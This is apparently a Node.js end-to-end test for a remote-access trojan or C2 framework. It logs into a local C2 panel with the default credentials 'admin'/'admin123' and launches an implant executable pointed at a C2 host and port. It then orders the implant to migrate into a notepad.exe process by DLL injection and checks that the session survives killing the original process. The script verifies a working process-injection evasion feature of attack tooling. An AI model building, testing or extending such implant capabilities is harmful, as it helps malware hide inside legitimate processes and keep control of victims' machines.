/**
 * E2E: real migrate — session must live inside notepad PID
 */
const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const http = require('http');

const ROOT = path.join(__dirname, '..');
const HOST = '127.0.0.1';
const PORT = 5000;
const BUILD_ID = 'mv0u6r92_be5959a0';
const EXE = path.join(ROOT, 'builds', BUILD_ID, 'migrate_pack.exe');

function post(pathname, body) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = http.request(
      { hostname: HOST, port: PORT, path: pathname, method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } },
      (res) => {
        let raw = '';
        res.on('data', (c) => (raw += c));
        res.on('end', () => {
          try { resolve({ status: res.statusCode, data: JSON.parse(raw || '{}') }); }
          catch { resolve({ status: res.statusCode, data: raw }); }
        });
      }
    );
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}
function get(pathname, token) {
  return new Promise((resolve, reject) => {
    const req = http.request(
      { hostname: HOST, port: PORT, path: pathname, method: 'GET',
        headers: token ? { Authorization: `Bearer ${token}` } : {} },
      (res) => {
        let raw = '';
        res.on('data', (c) => (raw += c));
        res.on('end', () => {
          try { resolve({ status: res.statusCode, data: JSON.parse(raw || '{}') }); }
          catch { resolve({ status: res.statusCode, data: raw }); }
        });
      }
    );
    req.on('error', reject);
    req.end();
  });
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function killNoise() {
  for (const n of ['migrate_pack.exe', 'inject_fixed.exe', 'notepad.exe', 'UpdateManager.exe']) {
    try { execSync(`taskkill /IM ${n} /F`, { stdio: 'ignore' }); } catch (_) {}
  }
}

async function main() {
  if (!fs.existsSync(EXE)) throw new Error('missing ' + EXE);
  killNoise();
  await sleep(2000);

  const login = await post('/api/login', { username: 'admin', password: 'admin123' });
  const token = login.data.token;
  const beforeRaw = (await get('/api/clients', token)).data;
  const before = Array.isArray(beforeRaw) ? beforeRaw : (beforeRaw?.clients || []);
  const beforeIds = new Set(before.map((c) => c.id));

  spawn('notepad.exe', [], { detached: true, stdio: 'ignore' }).unref();
  await sleep(1500);
  const task = execSync('tasklist /FI "IMAGENAME eq notepad.exe" /FO CSV /NH', { encoding: 'utf8' });
  const notepadPid = Number((task.split(/\r?\n/).filter(Boolean)[0].split('","')[1] || '').replace(/"/g, ''));
  console.log('notepad PID', notepadPid);

  const io = require(path.join(ROOT, 'client', 'node_modules', 'socket.io-client'));
  const socket = io(`http://${HOST}:${PORT}`, { auth: { token }, transports: ['websocket'] });
  await new Promise((resolve, reject) => {
    socket.on('connect', resolve);
    socket.on('connect_error', reject);
    setTimeout(() => reject(new Error('socket timeout')), 10000);
  });

  console.log('launch', EXE);
  spawn(EXE, [], {
    detached: true, stdio: 'ignore', windowsHide: true,
    env: { ...process.env, C2_HOST: '127.0.0.1', C2_PORT: '2026' },
  }).unref();

  let clientId = null;
  for (let i = 0; i < 40; i++) {
    await sleep(1000);
    const raw = (await get('/api/clients', token)).data;
    const list = Array.isArray(raw) ? raw : (raw?.clients || []);
    const fresh = list.find((c) => !beforeIds.has(c.id) && c.active);
    if (fresh) { clientId = fresh.id; console.log('connected', clientId); break; }
  }
  if (!clientId) throw new Error('implant did not connect');

  await sleep(2500);
  console.log('sending migrate', notepadPid);

  const migrateResp = await new Promise((resolve) => {
    const t = setTimeout(() => resolve('TIMEOUT'), 90000);
    const onResp = (data) => {
      if (data?.clientId && data.clientId !== clientId) return;
      const text = String(data?.response || '');
      if (!/LoadLibrary|migrate|inject|SUCCESS|FAILED|embedded|REAL|Invalid|\.dll/i.test(text)) {
        console.log('skip', text.slice(0, 80));
        return;
      }
      clearTimeout(t);
      socket.off('commandResponse', onResp);
      resolve(text);
    };
    socket.on('commandResponse', onResp);
    socket.emit('executeCommand', { clientId, command: `migrate ${notepadPid}` });
  });
  console.log('\nMIGRATE RESULT:\n', migrateResp);

  if (/Invalid command|no embedded|requires a \.dll|WinExec/i.test(migrateResp)) {
    console.error('FAIL: not real inject');
    process.exit(2);
  }
  if (!/SUCCESS|LoadLibrary/i.test(migrateResp)) {
    console.error('FAIL: unexpected response');
    process.exit(3);
  }

  const clients = async () => {
    const raw = (await get('/api/clients', token)).data;
    return Array.isArray(raw) ? raw : (raw?.clients || []);
  };

  await sleep(5000);
  const after = await clients();
  const newer = after.filter((c) => c.active && c.id !== clientId && !beforeIds.has(c.id));
  console.log('active sessions after migrate (excluding original):', newer.length, newer.map((c) => c.id.slice(0, 8)));

  try { execSync('taskkill /IM migrate_pack.exe /F', { stdio: 'ignore' }); } catch (_) {}
  await sleep(3000);
  const still = (await clients()).filter((c) => c.active);
  console.log('active after killing migrate_pack.exe:', still.map((c) => c.id.slice(0, 8)));

  try { execSync(`taskkill /PID ${notepadPid} /F`, { stdio: 'ignore' }); } catch (_) {}
  await sleep(3000);
  const still2 = (await clients()).filter((c) => c.active);
  console.log('active after killing notepad:', still2.map((c) => c.id.slice(0, 8)));

  console.log('PASS: migrate LoadLibrary path executed');
  process.exit(0);
}

main().catch((e) => { console.error(e); process.exit(1); });
